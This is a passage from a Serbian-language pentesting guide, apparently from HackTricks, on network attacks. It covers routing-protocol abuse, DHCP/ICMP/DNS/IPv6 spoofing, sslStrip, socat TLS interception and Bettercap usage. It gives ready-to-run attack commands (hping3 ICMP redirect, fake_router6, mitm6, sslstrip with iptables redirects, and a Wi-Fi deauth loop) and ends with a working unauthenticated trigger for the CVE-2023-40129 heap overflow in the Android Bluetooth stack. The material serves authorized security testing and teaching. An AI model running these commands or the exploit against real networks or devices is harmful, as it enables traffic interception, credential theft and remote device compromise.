**FHRP** (First Hop Redundancy Protocol) je klasa mrežnih protokola osmišljena da uspostavi aktivni redundantni sistem rutiranja. Pomoću FHRP, fizički ruteri mogu biti kombinovani u jedan logički uređaj, što povećava toleranciju na greške i pomaže u raspodeli opterećenja.

**Inženjeri Cisco Systems razvili su dva FHRP protokola, GLBP i HSRP.**


{{#ref}}
glbp-and-hsrp-attacks.md
{{#endref}}

### RIP

Poznate su tri verzije Routing Information Protocol (RIP): RIP, RIPv2 i RIPng. RIP i RIPv2 šalju datagrame vršnjacima preko UDP porta 520, dok RIPng emituje datagrame na UDP port 521 putem IPv6 multicast-a. RIPv2 je uveo podršku za MD5 autentifikaciju. S druge strane, RIPng nema ugrađenu autentifikaciju; umesto toga oslanja se na opcione IPsec AH i ESP zaglavlja u IPv6.

- **RIP and RIPv2:** Komunikacija se obavlja putem UDP datagrama na portu 520.
- **RIPng:** Koristi UDP port 521 za emitovanje datagrama putem IPv6 multicast-a.

Napomena: RIPv2 podržava MD5 autentifikaciju dok RIPng ne uključuje ugrađenu autentifikaciju, oslanjajući se na IPsec AH i ESP zaglavlja u IPv6.

### EIGRP Attacks

**EIGRP (Enhanced Interior Gateway Routing Protocol)** je dinamički routing protokol. **To je distance-vector protokol.** Ako nema autentifikacije i konfigurisanih passive interfejsa, napadač može da ometa EIGRP rutiranje i izazove trovanje routing tabela. Štaviše, EIGRP mreža (drugim rečima, autonomous system) je ravna i nema segmentaciju na zone. Ako napadač ubaci rutu, verovatno je da će se ta ruta proširiti kroz ceo autonomni EIGRP sistem.

Za napad na EIGRP sistem potrebno je uspostaviti neighbourhood sa legitimnim EIGRP router-om, što otvara mnoge mogućnosti, od osnovnog izviđanja do različitih injekcija.

[**FRRouting**](https://frrouting.org/) omogućava implementaciju virtualnog rutera koji podržava BGP, OSPF, EIGRP, RIP i druge protokole. Sve što treba da uradite je da ga postavite na sistem napadača i možete se predstavljati kao legitimni ruter u routing domenu.


{{#ref}}
eigrp-attacks.md
{{#endref}}

[**Coly**](https://code.google.com/p/coly/) ima mogućnosti za presretanje EIGRP broadcast-ova. Takođe omogućava injektovanje paketa, što se može iskoristiti za izmenu routing konfiguracija.

### OSPF

U Open Shortest Path First (OSPF) protokolu, MD5 autentifikacija se često koristi kako bi se obezbedila sigurna komunikacija između rutera. Međutim, ova mera bezbednosti može biti kompromitovana korišćenjem alata kao što su Loki i John the Ripper. Ovi alati mogu da uhvate i razbiju MD5 hešove, otkrivajući autentifikacioni ključ. Kada se ključ dobije, može se koristiti za unošenje novih routing informacija. Za konfigurisanje parametara ruta i uspostavljanje kompromitovanog ključa koriste se kartice _Injection_ i _Connection_, redom.

- **Capturing and Cracking MD5 Hashes:** Alati kao što su Loki i John the Ripper služe za ovo.
- **Configuring Route Parameters:** Ovo se radi kroz karticu _Injection_.
- **Setting the Compromised Key:** Ključ se podešava u kartici _Connection_.

### Other Generic Tools & Sources

- [**Above**](https://github.com/c4s73r/Above): Alat za skeniranje mrežnog saobraćaja i pronalaženje ranjivosti
- Više informacija o network attacks možete pronaći [**ovde**](https://github.com/Sab0tag3d/MITM-cheatsheet).

## **Spoofing**

Napadač konfiguriše sve mrežne parametre (GW, IP, DNS) novog člana mreže slanjem lažnih DHCP odgovora.
```bash
Ettercap
yersinia dhcp -attack 2 #More parameters are needed
```
### ARP Spoofing

Pogledajte [prethodni odeljak](#arp-spoofing).

### ICMPRedirect

ICMP Redirect se sastoji u slanju ICMP packet type 1 code 5 koji ukazuje da je attacker najbolji način da se dođe do IP-a. Zatim, kada victim želi da kontaktira IP, poslaće packet preko attackera.
```bash
Ettercap
icmp_redirect
hping3 [VICTIM IP ADDRESS] -C 5 -K 1 -a [VICTIM DEFAULT GW IP ADDRESS] --icmp-gw [ATTACKER IP ADDRESS] --icmp-ipdst [DST IP ADDRESS] --icmp-ipsrc [VICTIM IP ADDRESS] #Send icmp to [1] form [2], route to [3] packets sent to [4] from [5]
```
### DNS Spoofing

The attacker će razrešiti neke (ili sve) domene koje the victim zahteva.
```bash
set dns.spoof.hosts ./dns.spoof.hosts; dns.spoof on
```
**Konfigurišite sopstveni DNS sa dnsmasq**
```bash
apt-get install dnsmasq
echo "addn-hosts=dnsmasq.hosts" > dnsmasq.conf
echo "127.0.0.1   domain.example.com" > dnsmasq.hosts
sudo dnsmasq -C dnsmasq.conf --no-daemon
dig @localhost domain.example.com # Test the configured DNS
```
### Lokalni Gateways

Često postoji više ruta do sistema i mreža. Nakon sastavljanja liste MAC adresa unutar lokalne mreže, koristi _gateway-finder.py_ da identifikuješ hostove koji podržavaju IPv4 forwarding.

<details>
<summary>primer upotrebe gateway-finder</summary>
```bash
root@kali:~# git clone https://github.com/pentestmonkey/gateway-finder.git
root@kali:~# cd gateway-finder/
root@kali:~# arp-scan -l | tee hosts.txt
Interface: eth0, datalink type: EN10MB (Ethernet)
Starting arp-scan 1.6 with 256 hosts (http://www.nta-monitor.com/tools/arp-scan/)
10.0.0.100     00:13:72:09:ad:76       Dell Inc.
10.0.0.200     00:90:27:43:c0:57       INTEL CORPORATION
10.0.0.254     00:08:74:c0:40:ce       Dell Computer Corp.

root@kali:~/gateway-finder# ./gateway-finder.py -f hosts.txt -i 209.85.227.99
gateway-finder v1.0 http://pentestmonkey.net/tools/gateway-finder
[+] Using interface eth0 (-I to change)
[+] Found 3 MAC addresses in hosts.txt
[+] We can ping 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
[+] We can reach TCP port 80 on 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
```
</details>


### [Spoofing LLMNR, NBT-NS, and mDNS](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

Za lokalno rešavanje imena hostova kada DNS upiti ne uspeju, Microsoft sistemi se oslanjaju na **Link-Local Multicast Name Resolution (LLMNR)** i **NetBIOS Name Service (NBT-NS)**. Slično tome, implementacije **Apple Bonjour** i **Linux zero-configuration** koriste **Multicast DNS (mDNS)** za otkrivanje sistema unutar mreže. Zbog neautentifikovane prirode ovih protokola i njihovog rada preko UDP-a, slanjem broadcast poruka, oni mogu biti iskorišćeni od strane napadača koji pokušavaju da preusmere korisnike na zlonamerne servise.

Možete se predstavljati kao servisi koje hostovi traže koristeći Responder da šalje lažne odgovore.\
Pročitajte ovde više informacija o [how to Impersonate services with Responder](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md).

### [Spoofing WPAD](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

Pregledači često koriste **Web Proxy Auto-Discovery (WPAD) protocol za automatsko preuzimanje proxy podešavanja**. To uključuje preuzimanje konfiguracionih podataka sa servera, konkretno preko URL-a kao što je "http://wpad.example.org/wpad.dat". Otkriće ovog servera od strane klijenata može se desiti preko različitih mehanizama:

- Putem **DHCP**, gde se otkrivanje olakšava korišćenjem posebnog koda 252 entry.
- Preko **DNS**, što uključuje pretragu host imena označenog kao _wpad_ unutar lokalnog domena.
- Kroz **Microsoft LLMNR and NBT-NS**, koji su fallback mehanizmi korišćeni u slučajevima kada DNS upiti ne uspeju.

Alat Responder iskorišćava ovaj protokol delujući kao **malicious WPAD server**. Koristi DHCP, DNS, LLMNR i NBT-NS da zavedu klijente da se povežu na njega. Da biste dublje istražili kako servisi mogu biti impersonirani koristeći Responder [check this](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md).

### [Spoofing SSDP and UPnP devices](spoofing-ssdp-and-upnp-devices.md)

Možete ponuditi različite servise u mreži da pokušate da prevarite korisnika da unese neke **plain-text credentials**. **More information about this attack in** [**Spoofing SSDP and UPnP Devices**](spoofing-ssdp-and-upnp-devices.md)**.**

### IPv6 Neighbor Spoofing

Ovaj napad je veoma sličan ARP Spoofing-u, ali u IPv6 svetu. Možete naterati žrtvu da misli da IPv6 adresa GW-a ima MAC adresu napadača.
```bash
sudo parasite6 -l eth0 # This option will respond to every requests spoofing the address that was requested
sudo fake_advertise6 -r -w 2 eth0 <Router_IPv6> #This option will send the Neighbor Advertisement packet every 2 seconds
```
### IPv6 Router Advertisement Spoofing/Flooding

Neki OS-ovi podešavaju podrazumevani gateway na osnovu RA paketa poslatih u mreži. Da biste proglasili napadača IPv6 ruterom, možete koristiti:
```bash
sysctl -w net.ipv6.conf.all.forwarding=1 4
ip route add default via <ROUTER_IPv6> dev wlan0
fake_router6 wlan0 fe80::01/16
```
### IPv6 DHCP spoofing

Podrazumevano, neki OS pokušavaju da konfigurišu DNS čitajući DHCPv6 paket na mreži. Tada napadač može poslati DHCPv6 paket da se predstavi kao DNS. DHCP takođe dodeljuje IPv6 adresu žrtvi.
```bash
dhcp6.spoof on
dhcp6.spoof.domains <list of domains>

mitm6
```
### HTTP (fake page and JS code injection)

## Internet Attacks

### sslStrip

U suštini, šta ovaj attack radi jeste da, u slučaju da **user** pokuša da **access** **HTTP** stranicu koja se **redirecting** na **HTTPS** verziju, **sslStrip** će **maintain** **HTTP connection with** **client** i **HTTPS connection with** **server**, tako da će moći da **sniff** konekciju u **plain text**.
```bash
apt-get install sslstrip
sslstrip -w /tmp/sslstrip.log --all - l 10000 -f -k
#iptables --flush
#iptables --flush -t nat
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
iptables -A INPUT -p tcp --destination-port 10000 -j ACCEPT
```
More info [here](https://www.blackhat.com/presentations/bh-dc-09/Marlinspike/BlackHat-DC-09-Marlinspike-Defeating-SSL.pdf).

### sslStrip+ i dns2proxy za zaobilaženje HSTS

The **difference** between **sslStrip+ and dns2proxy** against **sslStrip** is that they will **redirect** for example _**www.facebook.com**_ **to** _**wwww.facebook.com**_ (note the **extra** "**w**") and will set the **address of this domain as the attacker IP**. This way, the **client** will **connect** to _**wwww.facebook.com**_ **(the attacker)** but behind the scenes **sslstrip+** will **maintain** the **real connection** via https with **www.facebook.com**.

Cilj ove tehnike je da **izbegne HSTS** zato što _**wwww**.facebook.com_ **neće** biti sačuvan u **cache** pregledača, pa će pregledač biti prevaren da izvrši **facebook authentication in HTTP**.\
Napomena: da bi se izveo ovaj napad žrtva mora inicijalno pokušati da pristupi [http://www.faceook.com](http://www.faceook.com) a ne https. Ovo se može uraditi izmenom linkova unutar http stranice.

Više informacija [here](https://www.bettercap.org/legacy/#hsts-bypass), [here](https://www.slideshare.net/Fatuo__/offensive-exploiting-dns-servers-changes-blackhat-asia-2014) i [here](https://security.stackexchange.com/questions/91092/how-does-bypassing-hsts-with-sslstrip-work-exactly).

**sslStrip or sslStrip+ doesn't work anymore. This is because there are HSTS rules presaved in the browsers, so even if it's the first time that a user access an "important" domain he will access it via HTTPS. Also, notice that the presaved rules and other generated rules can use the flag** [**`includeSubdomains`**](https://hstspreload.appspot.com) **so the** _**wwww.facebook.com**_ **example from before won't work anymore as** _**facebook.com**_ **uses HSTS with `includeSubdomains`.**

TODO: easy-creds, evilgrade, metasploit, factory

## TCP listen na portu
```bash
sudo nc -l -p 80
socat TCP4-LISTEN:80,fork,reuseaddr -
```
## TCP + SSL slušanje na portu

#### Generisanje ključeva i samopotpisanog sertifikata
```
FILENAME=server
# Generate a public/private key pair:
openssl genrsa -out $FILENAME.key 1024
# Generate a self signed certificate:
openssl req -new -key $FILENAME.key -x509 -sha256 -days 3653 -out $FILENAME.crt
# Generate the PEM file by just appending the key and certificate files:
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
```
#### Slušanje pomoću sertifikata
```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0 -
```
#### Slušaj koristeći certificate i preusmeri na hosts
```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0  openssl-connect:[SERVER]:[PORT],verify=0
```
Ponekad, ako klijent proverava da li je CA važeći, možete **poslužiti sertifikat za drugi hostname potpisan od strane CA**.\
Još jedan interesantan test, je poslužiti c**ertifikat zahtevanog hostname-a ali self-signed**.

Druga stvar za testiranje je pokušati potpisati sertifikat validnim sertifikatom koji nije CA. Ili koristiti validan public key, prisiliti korišćenje algoritma kao diffie hellman (koji ne zahteva dekriptovanje ničega stvarnim private key-om) i kada klijent zatraži probe stvarnog private key-a (kao hash) poslati lažan probe i očekivati da klijent to ne proveri.

## Bettercap

<details>
<summary>Uobičajene Bettercap komande</summary>
```bash
# Events
events.stream off #Stop showing events
events.show #Show all events
events.show 5 #Show latests 5 events
events.clear

# Ticker (loop of commands)
set ticker.period 5; set ticker.commands "wifi.deauth DE:AD:BE:EF:DE:AD"; ticker on

# Caplets
caplets.show
caplets.update

# Wifi
wifi.recon on
wifi.deauth BSSID
wifi.show
# Fake wifi
set wifi.ap.ssid Banana
set wifi.ap.bssid DE:AD:BE:EF:DE:AD
set wifi.ap.channel 5
set wifi.ap.encryption false #If true, WPA2
wifi.recon on; wifi.ap
```
</details>


### Beleške o aktivnom otkrivanju

Imajte na umu da kada se UDP paket pošalje uređaju koji nema traženi port, šalje se ICMP (Port Unreachable).

### **ARP discover**

ARP paketi se koriste za otkrivanje koji IP-ovi se koriste unutar mreže. Računar mora poslati zahtev za svaku moguću IP adresu i samo oni koji su u upotrebi će odgovoriti.

### **mDNS (multicast DNS)**

Bettercap šalje MDNS zahtev (svakih X ms) za **\_services\_.dns-sd.\_udp.local** — mašina koja primi ovaj paket obično odgovori. Nakon toga se traže samo mašine koje odgovaraju sa "services".

**Alati**

- Avahi-browser (--all)
- Bettercap (net.probe.mdns)
- Responder

### **NBNS (NetBios Name Server)**

Bettercap šalje broadcast pakete na port 137/UDP tražeći ime "CKAAAAAAAAAAAAAAAAAAAAAAAAAAA".

### **SSDP (Simple Service Discovery Protocol)**

Bettercap šalje SSDP broadcast pakete u potrazi za svim vrstama servisa (UDP Port 1900).

### **WSD (Web Service Discovery)**

Bettercap šalje WSD broadcast pakete u potrazi za servisima (UDP Port 3702).


## Bluetooth (L2CAP/ATT/GATT) Attacks

- Android Fluoride izlaže servise preko L2CAP PSMs (e.g., SDP 0x0001, RFCOMM 0x0003, BNEP 0x000F, AVCTP 0x0017/0x001B, AVDTP 0x0019, ATT/GATT 0x001F). Servisi se registruju putem:
```c
uint16_t L2CA_Register2(uint16_t psm, const tL2CAP_APPL_INFO& p_cb_info,
bool enable_snoop, tL2CAP_ERTM_INFO* p_ertm_info,
uint16_t my_mtu, uint16_t required_remote_mtu,
uint16_t sec_level);
```
- BlueBlue framework omogućava Scapy-based L2CAP/ATT crafting (izgrađen na BlueBorne l2cap_infra). Primer:
```python
acl  = ACLConnection(src_bdaddr, dst_bdaddr, auth_mode='justworks')
gatt = acl.l2cap_connect(psm=PSM_ATT, mtu=672)
gatt.send_frag(p8(GATT_READ)+p16(1234))
print(gatt.recv())
```
- CVE-2023-40129 (Fluoride GATT): integer underflow u Read Multiple Variable response builder-u može dovesti do ~64KB heap overflow kada MTU skraćuje element promenljive dužine, ali +2 length field nije uračunat.

<details>
<summary>Osnovni uzrok (GATT Read Multiple Variable)</summary>
```c
static void build_read_multi_rsp(tGATT_SR_CMD* p_cmd, uint16_t mtu) {
uint16_t ii, total_len, len; uint8_t* p; bool is_overflow=false;
len = sizeof(BT_HDR) + L2CAP_MIN_OFFSET + mtu;
BT_HDR* p_buf = (BT_HDR*)osi_calloc(len); p_buf->offset=L2CAP_MIN_OFFSET;
p = (uint8_t*)(p_buf + 1) + p_buf->offset; *p++ = GATT_RSP_READ_MULTI_VAR;
p_buf->len=1;
for (ii=0; ii<p_cmd->multi_req.num_handles; ii++) {
tGATTS_RSP* p_rsp = ...; // dequeued
if (p_rsp) {
total_len = (p_buf->len + p_rsp->attr_value.len);
if (p_cmd->multi_req.variable_len) total_len += 2;
if (total_len > mtu) {
len = p_rsp->attr_value.len - (total_len - mtu); // BUG: ignores +2
is_overflow = true;
} else { len = p_rsp->attr_value.len; }
if (p_cmd->multi_req.variable_len) { UINT16_TO_STREAM(p, len); p_buf->len += 2; }
memcpy(p, p_rsp->attr_value.value, len); // heap overflow
if (!is_overflow) p += len; p_buf->len += len; if (is_overflow) break;
}
}
}
```
- Za unose promenljive dužine, overflow path oduzima samo (total_len - mtu), ignorišući +2 length field, tako da len underflows (npr. 0xFFFE) i memcpy writes ~64KB past the end of the buffer.
</details>

- Minimalni neautentifikovani trigger (small MTU forces underflow on the 4th attribute):
```python
# GATT_REQ_READ_MULTI_VAR (0x20), MTU=55
acl  = ACLConnection(interface, bdaddr)
gatt = acl.l2cap_connect(psm=PSM_ATT, mtu=55)
pkt  = b'\x20'  # opcode
pkt += p16(9); pkt += p16(9); pkt += p16(9); pkt += p16(9)
gatt.send(pkt)
# On 4th insert: p_buf->len=55 (1 + 3*(16+2)), total_len=73 -> len=16-(73-55)=-2 -> ~64KB overwrite
```
### Telekom / Mobile-Core (GTP) Eksploatacija


{{#ref}}
telecom-network-exploitation.md
{{#endref}}

## Reference

- [https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)
- **Network Security Assessment: Know Your Network (3rd edition)**
- **Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things. By Fotios Chantzis, Ioannis Stais, Paulino Calderon, Evangelos Deirmentzoglou, Beau Wood**
- [https://medium.com/@cursedpkt/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@cursedpkt/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)
- [Paint it blue: Attacking the bluetooth stack (Synacktiv)](https://www.synacktiv.com/en/publications/paint-it-blue-attacking-the-bluetooth-stack)
- [BlueBorne L2CAP testing infra (l2cap_infra)](https://github.com/ArmisSecurity/blueborne/tree/master/l2cap_infra)



{{#include ../../banners/hacktricks-training.md}}
